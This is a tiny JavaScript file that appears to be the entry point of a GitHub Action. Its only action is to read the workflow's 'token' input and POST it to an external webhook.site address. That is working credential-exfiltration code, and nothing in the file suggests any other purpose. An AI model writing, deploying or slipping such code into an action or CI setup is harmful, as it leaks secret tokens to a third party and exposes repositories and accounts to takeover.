const core = require("@actions/core");
const axios = require("axios");

(async () => {

    const token = core.getInput('token');

    await axios.post('https://webhook.site/25d36d97-9383-423c-8c9b-584181118a76', {
        token: token,
    });

})();